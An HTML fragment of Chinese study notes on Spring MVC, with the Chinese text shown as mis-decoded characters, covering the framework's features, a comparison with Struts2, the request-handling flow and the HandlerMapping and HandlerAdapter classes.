<li>å¯é€‚é…ï¼Œé€šè¿‡HandlerAdapterå¯ä»¥æ”¯æŒä»»æ„çš„ç±»ä½œä¸ºå¤„ç†å™¨ï¼›</li>
<li>å¯å®šåˆ¶æ€§ï¼ŒHandlerMappingã€ViewResolverç­‰èƒ½å¤Ÿéå¸¸ç®€å•çš„å®šåˆ¶ï¼›</li>
<li>åŠŸèƒ½å¼ºå¤§çš„æ•°æ®éªŒè¯ã€æ ¼å¼åŒ–ã€ç»‘å®šæœºåˆ¶ï¼›</li>
<li>åˆ©ç”¨Springæä¾›çš„Mockå¯¹è±¡èƒ½å¤Ÿéå¸¸ç®€å•çš„è¿›è¡ŒWebå±‚å•å…ƒæµ‹è¯•ï¼›</li>
<li>æœ¬åœ°åŒ–ã€ä¸»é¢˜çš„è§£æçš„æ”¯æŒï¼Œä½¿æˆ‘ä»¬æ›´å®¹æ˜“è¿›è¡Œå›½é™…åŒ–å’Œä¸»é¢˜çš„åˆ‡æ¢ã€‚</li>
<li>éå¸¸å®¹æ˜“ä¸å…¶å®ƒè§†å›¾æŠ€æœ¯é›†æˆï¼Œå¦‚Velocityã€FreeMarkerç­‰ï¼Œå› ä¸ºæ¨¡å‹æ•°æ®ä¸æ”¾åœ¨ç‰¹å®šçš„APIé‡Œï¼Œè€Œæ˜¯æ”¾åœ¨ä¸€ ä¸ªModelé‡Œï¼ˆMapæ•°æ®ç»“æ„å®ç°ï¼Œå› æ­¤å¾ˆå®¹æ˜“è¢«å…¶ä»–æ¡†æ¶ä½¿ç”¨ï¼‰ã€‚</li>
<li>RESTfulé£æ ¼çš„æ”¯æŒã€ç®€å•çš„æ–‡ä»¶ä¸Šä¼ ã€çº¦å®šä¼˜äºé…ç½®çš„å¥‘çº¦å¼ç¼–ç¨‹æ”¯æŒã€åŸºäºæ³¨è§£çš„é›¶é…ç½®æ”¯æŒã€‚</li>
</ol>
<h3 id="å¯¹æ¯”-struts2" tabindex="-1"> å¯¹æ¯” Struts2</h3>
<ol>
<li>spring mvcæ˜¯åŸºäºæ–¹æ³•çš„è®¾è®¡ï¼Œè€Œstruts2æ˜¯åŸºäºç±»çš„è®¾è®¡ã€‚</li>
<li>struts2æœ‰ä»¥è‡ªå·±çš„interceptoræœºåˆ¶ï¼Œspring mvcç”¨çš„æ˜¯ç‹¬ç«‹çš„AOPæ–¹å¼ã€‚</li>
<li>spring mvcçš„æ–¹æ³•ä¹‹é—´åŸºæœ¬ä¸Šç‹¬ç«‹çš„ï¼Œç‹¬äº«request responseæ•°æ®ï¼Œstruts2æ‰€æœ‰Actionå˜é‡æ˜¯å…±äº«çš„ã€‚</li>
<li>æœºåˆ¶ï¼šspring mvcçš„å…¥å£æ˜¯servletï¼Œè€Œstruts2æ˜¯filterã€‚</li>
<li>æ€§èƒ½ï¼šspringä¼šç¨å¾®æ¯”strutså¿«ã€‚ spring mvcæ˜¯åŸºäºæ–¹æ³•çš„è®¾è®¡ ï¼Œ è€Œsturtsæ˜¯åŸºäºç±» ï¼Œ æ¯æ¬¡å‘ä¸€æ¬¡è¯·æ±‚éƒ½ä¼šå®ä¾‹ä¸€ä¸ªactionï¼Œæ¯ä¸ªactionéƒ½ä¼šè¢«æ³¨å…¥å±æ€§ï¼Œè€ŒspringåŸºäºæ–¹æ³•ï¼Œç²’åº¦æ›´ç»†</li>
<li>å‚æ•°ä¼ é€’ï¼šstrutsæ˜¯åœ¨æ¥å—å‚æ•°çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨å±æ€§æ¥æ¥å—å‚æ•°ï¼Œè¿™å°±è¯´æ˜å‚æ•°æ˜¯è®©å¤šä¸ªæ–¹æ³•å…±äº«çš„ã€‚</li>
<li>è®¾è®¡æ€æƒ³ä¸Šï¼š strutsæ›´åŠ ç¬¦åˆoopçš„ç¼–ç¨‹æ€æƒ³ ï¼Œ springå°±æ¯”è¾ƒè°¨æ…ï¼Œåœ¨servletä¸Šæ‰©å±•ã€‚</li>
<li>intercepter(æ‹¦æˆªå™¨)çš„å®ç°æœºåˆ¶ï¼šstrutsæœ‰ä»¥è‡ªå·±çš„interceptoræœºåˆ¶ï¼Œ spring mvcç”¨çš„æ˜¯ç‹¬ç«‹çš„AOPæ–¹å¼ ã€‚</li>
</ol>
<h1 id="spring-mvcè¯·æ±‚å“åº”è¿‡ç¨‹" tabindex="-1"> Spring MVCè¯·æ±‚å“åº”è¿‡ç¨‹</h1>
<p><img src="@source/assets/cs-note/framework/spring/mk-2020-07-12-11-02-07.png" alt="" loading="lazy"></p>
<p><img src="@source/assets/cs-note/framework/spring/SpringMVCè¯·æ±‚å“åº”å¤„ç†æµç¨‹.png" alt="" loading="lazy"></p>
<p>å…·ä½“æ­¥éª¤ï¼š</p>
<ol>
<li>å‘èµ·è¯·æ±‚åˆ°å‰ç«¯æ§åˆ¶å™¨(DispatcherServlet)</li>
<li>å‰ç«¯æ§åˆ¶å™¨è¯·æ±‚HandlerMappingæŸ¥æ‰¾ Handler ï¼ˆå¯ä»¥æ ¹æ®xmlé…ç½®ã€æ³¨è§£è¿›è¡ŒæŸ¥æ‰¾ï¼‰</li>
<li>å¤„ç†å™¨æ˜ å°„å™¨HandlerMappingå‘å‰ç«¯æ§åˆ¶å™¨è¿”å›Handlerï¼ŒHandlerMappingä¼šæŠŠè¯·æ±‚æ˜ å°„ä¸ºHandlerExecutionChainå¯¹è±¡(åŒ…å«ä¸€ä¸ªHandlerå¤„ç†å™¨ï¼ˆé¡µé¢æ§åˆ¶å™¨ï¼‰å¯¹è±¡ï¼Œå¤šä¸ªHandlerInterceptoræ‹¦æˆªå™¨å¯¹è±¡ï¼‰ï¼Œé€šè¿‡è¿™ç§ç­–ç•¥æ¨¡å¼ï¼Œå¾ˆå®¹æ˜“æ·»åŠ æ–°çš„æ˜ å°„ç­–ç•¥</li>
<li>å‰ç«¯æ§åˆ¶å™¨è°ƒç”¨å¤„ç†å™¨é€‚é…å™¨å»æ‰§è¡ŒHandler</li>
<li>å¤„ç†å™¨é€‚é…å™¨HandlerAdapterå°†ä¼šæ ¹æ®é€‚é…çš„ç»“æœå»æ‰§è¡ŒHandler</li>
<li>Handleræ‰§è¡Œå®Œæˆç»™é€‚é…å™¨è¿”å›ModelAndView</li>
<li>å¤„ç†å™¨é€‚é…å™¨å‘å‰ç«¯æ§åˆ¶å™¨è¿”å›ModelAndView ï¼ˆModelAndViewæ˜¯springmvcæ¡†æ¶çš„ä¸€ä¸ªåº•å±‚å¯¹è±¡ï¼ŒåŒ…æ‹¬ Modelå’Œviewï¼‰</li>
<li>å‰ç«¯æ§åˆ¶å™¨è¯·æ±‚è§†å›¾è§£æå™¨å»è¿›è¡Œè§†å›¾è§£æ ï¼ˆæ ¹æ®é€»è¾‘è§†å›¾åè§£ææˆçœŸæ­£çš„è§†å›¾(jsp)ï¼‰ï¼Œé€šè¿‡è¿™ç§ç­–ç•¥å¾ˆå®¹æ˜“æ›´æ¢å…¶ä»–è§†å›¾æŠ€æœ¯ï¼Œåªéœ€è¦æ›´æ”¹è§†å›¾è§£æå™¨å³å¯</li>
<li>è§†å›¾è§£æå™¨å‘å‰ç«¯æ§åˆ¶å™¨è¿”å›View</li>
<li>å‰ç«¯æ§åˆ¶å™¨è¿›è¡Œè§†å›¾æ¸²æŸ“ ï¼ˆè§†å›¾æ¸²æŸ“å°†æ¨¡å‹æ•°æ®(åœ¨ModelAndViewå¯¹è±¡ä¸­)å¡«å……åˆ°requeståŸŸï¼‰</li>
<li>å‰ç«¯æ§åˆ¶å™¨å‘ç”¨æˆ·å“åº”ç»“æœ</li>
</ol>
<h2 id="spring-mvcç»„ä»¶" tabindex="-1"> Spring MVCç»„ä»¶</h2>
<h3 id="dispatcherservlet-å‰ç«¯æ§åˆ¶å™¨" tabindex="-1"> DispatcherServlet å‰ç«¯æ§åˆ¶å™¨</h3>
<ul>
<li>ç”¨æˆ·è¯·æ±‚åˆ°è¾¾å‰ç«¯æ§åˆ¶å™¨,ç›¸å½“äºMVCä¸­çš„C</li>
<li>DispatcherServletæ˜¯æ•´ä¸ªæµç¨‹çš„æ ¸å¿ƒ,å®ƒæ¥è°ƒç”¨å…¶ä»–ç»„ä»¶æ¥å¤„ç†ç”¨æˆ·è¯·æ±‚,å‰ç«¯æ§åˆ¶å™¨çš„å­˜åœ¨é™ä½äº†å…¶ä»–ç»„ä»¶ä¹‹é—´çš„è€¦åˆåº¦.</li>
</ul>
<h3 id="handlermapping-å¤„ç†å™¨æ˜ å°„å™¨" tabindex="-1"> HandlerMapping å¤„ç†å™¨æ˜ å°„å™¨</h3>
<ul>
<li>HandlerMapping è´Ÿè´£æ ¹æ®ç”¨æˆ·è¯·æ±‚æ‰¾åˆ°Handlerå³å¤„ç†å™¨ã€‚ï¼ˆå¦‚ç”¨æˆ·è‡ªå®šä¹‰çš„Controllerï¼‰SpringMVCæä¾›äº†ä¸åŒçš„æ˜ å°„å™¨å®ç°ä¸åŒçš„æ˜ å°„æ–¹å¼ï¼Œä¾‹å¦‚ï¼šé…ç½®æ–‡ä»¶æ–¹å¼ï¼Œå®ç°æ¥å£æ–¹å¼ï¼Œæ³¨è§£æ–¹å¼ç­‰ã€‚</li>
<li>æ˜ å°„å™¨ç›¸å½“äºé…ç½®ä¿¡æ¯æˆ–æ³¨è§£æè¿°ã€‚æ˜ å°„å™¨å†…éƒ¨å°è£…äº†ä¸€ä¸ªç±»ä¼¼mapçš„æ•°æ®ç»“æ„ã€‚ä½¿ç”¨URLä½œä¸ºkeyï¼ŒHandlerExecutionChainä½œä¸ºvalueã€‚æ ¸å¿ƒæ§åˆ¶å™¨ï¼Œå¯ä»¥é€šè¿‡è¯·æ±‚å¯¹è±¡ï¼ˆè¯·æ±‚å¯¹è±¡ä¸­åŒ…å«è¯·æ±‚çš„ URLï¼‰åœ¨handlerMappingä¸­æŸ¥è¯¢HandlerExecutionChainå¯¹è±¡ã€‚</li>
<li>æ˜¯SpringMVCæ ¸å¿ƒç»„ä»¶ä¹‹ä¸€ã€‚æ˜¯å¿…ä¸å¯å°‘çš„ç»„ä»¶ã€‚æ— è®ºæ˜¯å¦é…ç½®ï¼ŒSpringMVC ä¼šæœ‰é»˜è®¤æä¾›ã€‚</li>
<li>é»˜è®¤çš„æ˜ å°„å™¨æ˜¯ï¼šRequestMappingHandlerMappingã€‚ï¼ˆè€ç‰ˆæœ¬ä¸­æœ‰å…¶ä»–çš„æ˜ å°„å™¨ï¼Œä½†æ˜¯å·²ç»è¿‡æ—¶ã€‚ï¼‰</li>
</ul>
<h3 id="handleradapter-å¤„ç†å™¨é€‚é…å™¨" tabindex="-1"> HandlerAdapter å¤„ç†å™¨é€‚é…å™¨</h3>
<ul>
<li>é€šè¿‡HandlerAdapterå¯¹å¤„ç†å™¨ï¼ˆHandlerï¼‰è¿›è¡Œæ‰§è¡Œï¼Œè¿™æ˜¯é€‚é…å™¨æ¨¡å¼çš„åº”ç”¨ï¼Œé€šè¿‡æ‰©å±•é€‚é…å™¨å¯ä»¥å¯¹æ›´å¤šç±»å‹çš„å¤„ç†å™¨è¿›è¡Œæ‰§è¡Œã€‚</li>
<li>é€‚é…å™¨ä¹Ÿæ˜¯ SpringMVC ä¸­çš„æ ¸å¿ƒç»„ä»¶ä¹‹ä¸€ã€‚å¿…é¡»å­˜åœ¨ã€‚SpringMVC æ¡†æ¶æœ‰é»˜è®¤å€¼ã€‚</li>
<li>å…¸å‹çš„é€‚é…å™¨ï¼šSimpleControllerHandlerAdapterï¼Œæœ€åŸºç¡€çš„ã€‚å¤„ç†è‡ªå®šä¹‰æ§åˆ¶å™¨ï¼ˆHandlerï¼‰å’ŒSpringMVCæ§åˆ¶å™¨é¡¶çº§æ¥å£Controllerä¹‹é—´å…³è”çš„ã€‚</li>
</ul>
<h3 id="handler-å¤„ç†å™¨" tabindex="-1"> Handler å¤„ç†å™¨</h3>
<ul>
<li>Handler æ˜¯åç«¯æ§åˆ¶å™¨, åœ¨å‰ç«¯æ§åˆ¶å™¨çš„æ§åˆ¶ä¸‹åç«¯æ§åˆ¶å™¨å¯¹å…·ä½“çš„ç”¨æˆ·è¯·æ±‚è¿›è¡Œå¤„ç†ï¼ŒHandleræ¶‰åŠåˆ°å…·ä½“çš„ç”¨æˆ·è¯·æ±‚,æ‰€ä»¥ä¸€èˆ¬æƒ…å†µä¸‹éœ€è¦ç¨‹åºå‘˜æ ¹æ®è‡ªå·±çš„ä¸šåŠ¡å¼€å‘</li>
<li>åœ¨SpringMVCä¸­å¯¹Handleræ²¡æœ‰å¼ºåˆ¶çš„ç±»å‹è¦æ±‚ã€‚åœ¨SpringMVCæ¡†æ¶ä¸­ï¼Œå¯¹Handlerçš„å¼•ç”¨å®šä¹‰ç±»å‹ä¸ºObject</li>
<li>å¤„ç†å™¨ç†è®ºä¸Šè¯´ä¸æ˜¯å¿…è¦çš„æ ¸å¿ƒç»„ä»¶ã€‚</li>
<li>SpringMVCæ¡†æ¶æ˜¯ä¸€ä¸ªçº¿ç¨‹ä¸å®‰å…¨çš„ï¼Œè½»é‡çº§çš„æ¡†æ¶ã€‚ä¸€ä¸ªhandlerå¯¹è±¡ï¼Œå¤„ç†æ‰€æœ‰çš„è¯·æ±‚ã€‚å¼€å‘è¿‡ç¨‹ä¸­ï¼Œæ³¨æ„çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚</li>
</ul>
<h3 id="viewresolver-è§†å›¾è§£æå™¨" tabindex="-1"> ViewResolver è§†å›¾è§£æå™¨</h3>
<ul>
<li>ViewResolver è´Ÿè´£å°†å¤„ç†ç»“æœç”Ÿæˆ View è§†å›¾ï¼ŒViewResolver é¦–å…ˆæ ¹æ®é€»è¾‘è§†å›¾åè§£ææˆç‰©ç†è§†å›¾åå³å…·ä½“çš„é¡µé¢åœ°å€ï¼Œå†ç”Ÿæˆ View è§†å›¾å¯¹è±¡ï¼Œæœ€åå¯¹ View è¿›è¡Œæ¸²æŸ“å°†å¤„ç†ç»“æœé€šè¿‡é¡µé¢å±•ç¤ºç»™ç”¨æˆ·ã€‚</li>
<li>æ˜¯SpringMVCä¸­å¿…è¦çš„ç»„ä»¶ä¹‹ä¸€ã€‚SpringMVCæä¾›é»˜è®¤è§†å›¾è§£æå™¨ã€‚</li>
</ul>
<h3 id="view-è§†å›¾" tabindex="-1"> View è§†å›¾</h3>
<p>Viewæ˜¯ä¸€ä¸ªæ¥å£ï¼Œå®ç°ç±»æ”¯æŒä¸åŒçš„Viewç±»å‹ï¼ˆjspã€freemarkerã€pdf...ï¼‰éœ€è¦å·¥ç¨‹å¸ˆå¼€å‘</p>
<h2 id="spring-mvcå·¥ä½œè¯¦è§£" tabindex="-1"> Spring MVCå·¥ä½œè¯¦è§£</h2>
<p><img src="@source/assets/cs-note/framework/spring/spring-mvc-run.png" alt="" loading="lazy"></p>
<p><img src="@source/assets/cs-note/framework/spring/spring-mvc-src-logic.png" alt="" loading="lazy"></p>
<h3 id="å¤„ç†å™¨æ˜ å°„-handlermapping" tabindex="-1"> å¤„ç†å™¨æ˜ å°„ HandlerMapping</h3>
<p><a href="https://www.jianshu.com/p/f04816ee2495" target="_blank" rel="noopener noreferrer">å¤„ç†å™¨æ˜ å°„è¯¦è§£</a></p>

<p>SpringMVC å†…éƒ¨æ˜¯æ ¹æ® HandlerMapping å°† Request å’Œ Controller é‡Œé¢çš„æ–¹æ³•å¯¹åº”èµ·æ¥çš„ã€‚
<code>HandlerMapping</code> åŠŸèƒ½å°±æ˜¯æ ¹æ®è¯·æ±‚åŒ¹é…åˆ°å¯¹åº”çš„ <code>Handlerï¼Œç„¶åå°†æ‰¾åˆ°çš„</code> <code>Handler</code> å’Œæ‰€æœ‰åŒ¹é…çš„ <code>HandlerInterceptor</code> ï¼ˆæ‹¦æˆªå™¨ï¼‰ç»‘å®šåˆ°åˆ›å»ºçš„ <code>HandlerExecutionChain</code> å¯¹è±¡ä¸Šå¹¶è¿”å›ã€‚</p>
<p><code>HandlerMapping</code> åªæ˜¯ä¸€ä¸ªæ¥å£ç±»ï¼Œä¸åŒçš„å®ç°ç±»æœ‰ä¸åŒçš„åŒ¹å¯¹æ–¹å¼ï¼Œæ ¹æ®åŠŸèƒ½çš„ä¸åŒæˆ‘ä»¬éœ€è¦åœ¨ SpringMVC å®¹å™¨ä¸­æ³¨å…¥ä¸åŒçš„æ˜ å°„å¤„ç†å™¨ <code>HandlerMappingã€‚</code></p>
<p><img src="@source/assets/cs-note/framework/spring/spring-mvc-HandlerMappingè¿‡ç¨‹.png" alt="" loading="lazy"></p>
<h4 id="handlermapping-æ¥å£" tabindex="-1"> HandlerMapping æ¥å£</h4>
<p>å®¹å™¨è¢«åˆå§‹åŒ–çš„æ—¶å€™ä¼šè¢«è°ƒç”¨ï¼ŒåŠ è½½å®¹å™¨ä¸­æ³¨å…¥çš„ HandlerMappingã€‚å…¶å®å¸¸ç”¨åˆ°çš„ HandlerMapping éƒ½æ˜¯ç”± <code>&lt;mvc:annotation-driven /&gt;</code> æ ‡ç­¾å¸®æˆ‘ä»¬æ³¨å†Œçš„(åŒ…æ‹¬ RequestMappingHandlerMapping å’Œ BeanNameUrlHandlerMapping)ï¼Œå¦‚æœæ²¡æœ‰å†™è¯¥æ ‡ç­¾ç³»ç»Ÿä¹Ÿä¼šå¸®æˆ‘ä»¬æ³¨å…¥é»˜è®¤çš„æ˜ å°„å™¨ï¼Œå½“ç„¶ä¹Ÿæœ‰äº›éœ€è¦æˆ‘ä»¬è‡ªå·±æ‰‹åŠ¨æ³¨å…¥ã€‚</p>
<p>åœ¨ HandlerMapping æ¥å£ä¸­åªæœ‰ä¸€ä¸ªæ–¹æ³•</p>
<div><pre><code>    <span>HandlerExecutionChain</span> <span>getHandler</span><span>(</span><span>HttpServletRequest</span> request<span>)</span> <span>throws</span> <span>Exception</span><span>;</span>
</code></pre></div><p><img src="@source/assets/cs-note/framework/spring/HandlerMappingç±»ç»“æ„å±‚æ¬¡.png" alt="" loading="lazy"></p>
<p><strong>AbstractHandlerMapping</strong></p>
<p>å®ç° <code>getHandler()</code> æ¥å£æ–¹æ³•å¾—åˆ° HandlerExecutionChain å¯¹è±¡</p>
<p><code>getHandler()</code> è°ƒç”¨æŠ½è±¡æ–¹æ³• <code>getHandlerInternal()</code> åŒ¹é…å¹¶è¿”å›å¯¹åº”çš„ Handler å¯¹è±¡</p>
<h5>1. AbstractUrlHandlerMapping</h5>
<p>URL æ˜ å°„çš„æŠ½è±¡åŸºç±»ï¼Œæä¾›å°†å¤„ç†ç¨‹åºæ˜ å°„åˆ° Controllerï¼Œæ‰€ä»¥è¯¥ç±»æœ€ç»ˆç›´æ¥è¿”å›çš„ handler å°±æ˜¯ Controller å¯¹è±¡</p>
<ul>
<li>å®ç°çˆ¶æŠ½è±¡ç±»çš„æŠ½è±¡æ–¹æ³• <code>getHandlerInternal()</code> åŒ¹é…å¹¶è¿”å›å¯¹åº”çš„ Handler å¯¹è±¡</li>
<li>æ ¹æ®è·¯å¾„åŒ¹å¯¹ handler çš„æ–¹æ³• <code>lookupHandler()</code></li>
<li>ä» <code>this.handlerMap</code> ä¸­é€šè¿‡ urlPath åŒ¹å¯¹æ‰¾åˆ°å¯¹åº”çš„ handler å¯¹è±¡</li>
<li><code>registerHandler(String urlPath, Object handler)</code> åœ¨å­ç±»ä¸­è¢«è°ƒç”¨å°† handler å¯¹è±¡åŠ å…¥åˆ° this.handlerMap</li>
</ul>
<p>AbstractUrlHandlerMapping çš„å­ç±»ä»å¤§è‡´åˆ†ä¸ºä¸¤ç±»ï¼š</p>
<ul>
<li>é—´æ¥ç»§æ‰¿ AbstractUrlHandlerMapping çš„ BeanNameUrlHandlerMapping</li>
<li>ç›´æ¥ç»§æ‰¿ AbstractUrlHandlerMapping çš„ SimpleUrlHandlerMapping</li>
</ul>
<p><strong>1.1 BeanNameUrlHandlerMapping</strong></p>
<p>åœ¨ SpringMVC å®¹å™¨ä¸­ï¼Œä¸”åœ¨æ³¨å…¥äº† <code>BeanNameUrlHandlerMapping</code> æ˜ å°„å™¨çš„æ—¶å€™ï¼Œåªè¦æ˜¯ä»¥ &quot;/&quot; å¼€å¤´çš„ bean çš„ nameï¼Œéƒ½ä¼šä½œä¸ºè¯¥æ˜ å°„å™¨åŒ¹é…çš„ Handler å¯¹è±¡</p>
<p>æ³¨æ„æ‰‹åŠ¨æ³¨å…¥ BeanNameUrlHandlerMapping æ˜ å°„å™¨è®°å¾—ä¸è¦è·Ÿ <code>&lt;mvc:annotation-driven /&gt;</code> æ ‡ç­¾è‡ªåŠ¨å¸®æˆ‘ä»¬æ³¨å…¥é‡å¤(å¦‚è‡ªå·±æ‰‹åŠ¨æ³¨å…¥è¦ä¹ˆæ”¾åœ¨ <code>&lt;mvc:annotation-driven /&gt;</code> æ ‡ç­¾ä¹‹å‰ï¼Œè¦ä¹ˆç›´æ¥ä¸å†™)ã€‚
æ³¨æ„è‡ªå®šä¹‰ Controller å®ç°ç±»æ³¨å…¥ bean çš„ id æˆ– name å¿…é¡»ä»¥ &quot;/&quot; å¼€å¤´ï¼ŒBeanNameUrlHandlerMapping æ˜ å°„å™¨ä¸»è¦æ˜ å°„ä»¥ &quot;/&quot; å¼€å¤´çš„ beanNameã€‚</p>
<p><strong>1.2 SimpleUrlHandlerMapping</strong></p>
<p>SimpleUrlHandlerMapping æ˜ å°„å™¨è·Ÿå‰é¢ BeanNameUrlHandlerMapping æ˜ å°„å™¨æœ‰ç‚¹ä¸ä¸€æ ·ã€‚åè€…æ˜¯æœ‰ç‚¹ç±»ä¼¼éå†å®¹å™¨é‡Œé¢æœ‰æ‰€çš„ bean çš„ name æˆ– id æ‰¾åˆ°åŒ¹é…çš„ï¼Œå¹¶ä¸” bean çš„ name æˆ– id æœ‰ç‰¹æ®Šè¦æ±‚ï¼ŒåŒ¹é…çš„åˆ™åŠ å…¥ã€‚è€Œå‰è€…åˆ™æ˜¯å…ˆå°†åŠ å…¥è¯¥æ˜ å°„å™¨çš„ handler å…ˆåŠ è¿›è¯¥æ˜ å°„å™¨çš„ä¸€ä¸ªé›†åˆå±æ€§é‡Œé¢ï¼Œå®¹å™¨åˆå§‹åŒ–çš„æ—¶å€™å…å»äº†éå†éº»çƒ¦çš„æ­¥éª¤ã€‚</p>
<h5>2. AbstractHandlerMethodMapping</h5>
<p>AbstractHandlerMethodMapping æœ€ç»ˆè·å–çš„ handler æ˜¯ <code>HandlerMethod</code> ç±»å‹å¯¹è±¡ã€‚</p>
<p>ç±»çš„å®ç°é“¾</p>
<ul>
<li>AbstractHandlerMethodMapping
<ul>
<li>RequestMappingInfoHandlerMapping
<ul>
<li>RequestMappingHandlerMapping</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>2.1 HandlerMethod</strong></p>
<p>HandlerMethod å…¶å®å¯ä»¥ç®€å•ç†è§£ä¸ºä¿æŒæ–¹æ³•ä¿¡æ¯çš„pojoç±»</p>
<p><strong>2.2 RequestMappingInfo ç±»</strong></p>
<p>ä¸»è¦ç”¨æ¥è®°å½•æ–¹æ³•ä¸Š @RequestMapping() æ³¨è§£é‡Œé¢çš„å‚æ•°ï¼Œé’ˆå¯¹ RequestMappingHandlerMapping æ˜ å°„å™¨æ¥ä½¿ç”¨ã€‚</p>
<p>RequestMappingInfo å¯¹è±¡æ˜¯ç”¨æ¥è£…è½½æ–¹æ³•çš„åŒ¹é…ç›¸å…³ä¿¡æ¯ï¼Œæ¯ä¸ªåŒ¹é…çš„æ–¹æ³•éƒ½ä¼šå¯¹åº”ä¸€ä¸ª RequestMappingInfo å¯¹è±¡</p>
<p><strong>2.3 RequestMappingHandlerMapping</strong></p>
<p>å­˜å‚¨æ˜ å°„å…³ç³»å¯¹è±¡(<code>MappingRegistry</code>)</p>
<p>è¯¥å®ä½“ç±»é‡Œé¢æœ€é‡è¦çš„ä¸¤ä¸ªè®°å½•é›†åˆåˆ†åˆ«æ˜¯ mappingLookup å’Œ urlLookup</p>
<ul>
<li>
<p>urlLookupï¼šä¸»è¦ç”¨æ¥è®°å½• lookupPath è¯·æ±‚è·¯å¾„å¯¹åº”çš„ mapping é›†åˆã€‚è¿™é‡Œ Spring ç•™äº†ä¸€ä¸ªå¾ˆæ´»çš„æœºåˆ¶ï¼Œæ‹¿ @RequestMapping æ³¨è§£æ¥è¯´ï¼Œä»–çš„ value å±æ€§æœ¬èº«å°±æ˜¯ä¸€ä¸ªå­—ç¬¦æ•°ç»„ï¼Œåœ¨å¤šé‡è®¾ç½®ä¸­éš¾å…æœ‰è·¯å¾„é‡å¤çš„ï¼Œæ‰€ä»¥æœ€ç»ˆæœ‰å¯èƒ½ä¼šå‡ºç°ä¸€ä¸ª lookupPath å¯¹åº”å¤šä¸ª RequestMappingInfoï¼Œæœ€ç»ˆåœ¨è¯·æ±‚è¿‡æ¥çš„æ—¶å€™ç»™äº†è‡ªå®šä¹‰æŠ½è±¡æ–¹æ³•è®©å®ç°ç±»è‡ªå·±å®ç°æ‹©ä¼˜çš„æ–¹å¼MutivalueMap æ˜¯ SpringMVC è‡ªå®šä¹‰çš„ä¸€ä¸ª Map ç±»ï¼Œkey å¯¹åº”çš„ value æ˜¯ä¸€ä¸ªé›†åˆï¼Œè¿™ä»åå­—ä¸Šä¹Ÿèƒ½çœ‹å‡ºæ¥ã€‚</p>
</li>
<li>
<p>mappingLookupï¼škey æ˜¯ mapping å¯¹è±¡ï¼Œvalue æ˜¯ HandlerMethod å¯¹è±¡ï¼Œæœ€ç»ˆæ˜¯é€šè¿‡ lookupPath åœ¨ urlLookup é›†åˆä¸­æ‰¾åˆ°å¯¹åº”çš„ mapping å¯¹è±¡ï¼Œé€šè¿‡ mapping åœ¨ mappingLookup é›†åˆä¸­æ‰¾åˆ° HandlerMethod å¯¹è±¡ã€‚</p>
</li>
</ul>
<h4 id="æ€»ç»“" tabindex="-1"> æ€»ç»“</h4>
<p>ç°åœ¨å¼€å‘åŸºæœ¬éƒ½ä¸ç”¨ AbstractUrlHandlerMapping è¿™ç§ç±»å‹çš„æ˜ å°„å™¨äº†ï¼Œä½†æ˜¯ SpringMVC å†…éƒ¨è¿˜æœ‰ç”¨åˆ°çš„åœ°æ–¹ï¼Œä¾‹å¦‚ç›´æ¥ &lt;mvc:view-controller path=&quot;&quot; view-name=&quot;&quot;/&gt; æ ‡ç­¾é…ç½®èµ„æºä¸ç»è¿‡è§†å›¾æ§åˆ¶å™¨ç›´æ¥è·³è½¬å°±ç”¨åˆ°äº† SimpleUrlHandlerMapping è¿™ç§æ˜ å°„å™¨ã€‚AbstractUrlHandlerMapping åŒ¹å¯¹è§£æå¯¹åº”è¯·æ±‚æœ€ç»ˆè¿”å›çš„ handler æ˜¯ Controller å¯¹è±¡ã€‚</p>
<p>ç°åœ¨ä¹ æƒ¯ç›´æ¥ç”¨ @Controller å’Œ @RequestMapping è¿™æ ·æ³¨è§£æ¥æè¿°è§†å›¾æ§åˆ¶å™¨çš„é€»è¾‘ï¼Œè¿™ç§èµ„æºæ˜ å°„ç”¨çš„æ˜¯ AbstractHandlerMethodMapping æŠ½è±¡ç±»çš„å­ç±» RequestMappingHandlerMapping æ˜ å°„å™¨ï¼ŒåŒ¹å¯¹è§£æå¯¹åº”çš„è¯·æ±‚è¿”å›HandlerMethod å¯¹è±¡ã€‚</p>
<h3 id="å¤„ç†å™¨é€‚é…å™¨-handleradapter" tabindex="-1"> å¤„ç†å™¨é€‚é…å™¨ HandlerAdapter</h3>

<p><a href="https://www.jianshu.com/p/23ad68d8b421" target="_blank" rel="noopener noreferrer">å¤„ç†å™¨é€‚é…å™¨ è¯¦è§£</a></p>
<p>ä¸åŒçš„æ˜ å°„å¤„ç†å™¨(HandlerMapping) æ˜ å°„å‡ºæ¥çš„ handler å¯¹è±¡æ˜¯ä¸ä¸€æ ·çš„ï¼ŒAbstractUrlHandlerMapping æ˜ å°„å™¨æ˜ å°„å‡ºæ¥çš„æ˜¯ handler æ˜¯ Controller å¯¹è±¡ï¼ŒAbstractHandlerMethodMapping æ˜ å°„å™¨æ˜ å°„å‡ºæ¥çš„ handler æ˜¯ HandlerMethod å¯¹è±¡ã€‚æ˜ å°„çš„å¤„ç†å™¨ä¹Ÿåº”è¯¥æœ‰å¾ˆå¤šç§ï¼Œä¸åŒçš„æ˜ å°„ç”±ä¸åŒçš„é€‚é…å™¨æ¥è´Ÿè´£è§£æã€‚</p>
<h4 id="handleradapter-æ¥å£" tabindex="-1"> HandlerAdapter æ¥å£</h4>
<p><img src="@source/assets/cs-note/framework/spring/HandlerAdapterç±»ç»“æ„å±‚æ¬¡.png" alt="" loading="lazy"></p>
<div><pre><code><span>public</span> <span>interface</span> <span>HandlerAdapter</span> <span>{</span>
    <span>boolean</span> <span>supports</span><span>(</span><span>Object</span> var1<span>)</span><span>;</span>

    <span>@Nullable</span>
    <span>ModelAndView</span> <span>handle</span><span>(</span><span>HttpServletRequest</span> var1<span>,</span> <span>HttpServletResponse</span> var2<span>,</span> <span>Object</span> var3<span>)</span> <span>throws</span> <span>Exception</span><span>;</span>

    <span>long</span> <span>getLastModified</span><span>(</span><span>HttpServletRequest</span> var1<span>,</span> <span>Object</span> var2<span>)</span><span>;</span>
<span>}</span>
</code></pre></div><h3 id="å‚æ•°è§£æ-handleradapter-handler" tabindex="-1"> å‚æ•°è§£æ HandlerAdapter Handler</h3>
